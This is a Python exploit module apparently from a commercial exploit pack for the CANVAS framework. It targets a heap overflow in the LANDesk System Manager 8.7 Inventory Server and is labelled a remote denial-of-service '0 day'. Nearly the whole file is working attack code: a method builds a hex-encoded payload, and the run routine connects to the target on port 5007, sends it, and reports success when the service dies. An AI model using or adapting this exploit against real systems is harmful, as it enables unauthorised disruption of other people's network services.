#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007
#


import sys

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit


# GUI info
NAME = "[0 Day] LANDesk System Manager 8.7 - Inventory Server Heap Overflow"

DESCRIPTION = "Heap overflow vulnerability in LANDesk System Manager 8.7 Inventory Server"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "Not public"
DOCUMENTATION["Versions Affected"] = "LANDesk System Manager <= 8.7 SP3"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"

VERSION = "1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "DoS"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "2003" ]

NOTES = """
"""

CHANGELOG = """
"""
    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port = 5007
        self.host = ""                          
        self.name = NAME        
        return
    
    def test(self):        
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
                
        s = self.gettcpsock()        
        
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0        
        
        return 1
    
    def run(self):	    		
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
        self.log("Attacking %s:%d"%(self.host, self.port))
        
        sploitstring = self.makesploit()
                
        try:            
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            s.sendall(sploitstring)
        except:            
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
            return 0
        
        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
        
        return 1
        
    def makesploit(self):
        """
        Construct the attack
        """
        sploitstring = "\x01\x04\x44\x65\x76\x69\x63\x65\x20\x49\x44\x20\x3d\x20\x7b\x38\x35\x46\x33\x35\x37\x30\x44\x2d\x38\x42\x44\x35\x2d\x45\x41\x34\x30\x2d\x41\x33\x38\x37\x2d\x42\x34\x38\x31\x42\x42\x38\x45\x30\x43\x31\x46\x7d\x00\x4e\x65\x74\x77\x6f\x72\x6b\x20\x2d\x20\x4e\x49\x43\x20\x41\x64\x64\x72\x65\x73\x73\x20\x3d\x20\x30\x30\x31\x31\x32\x35\x41\x31\x38\x41\x35\x36\x00\x4e\x65\x74\x77\x6f\x72\x6b\x20\x2d\x20\x54\x43\x50\x49\x50\x20\x2d\x20\x41\x64\x64\x72\x65\x73\x73\x20\x3d\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x33\x31\x2e\x30\x31\x31"
        
        return sploitstring
        

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
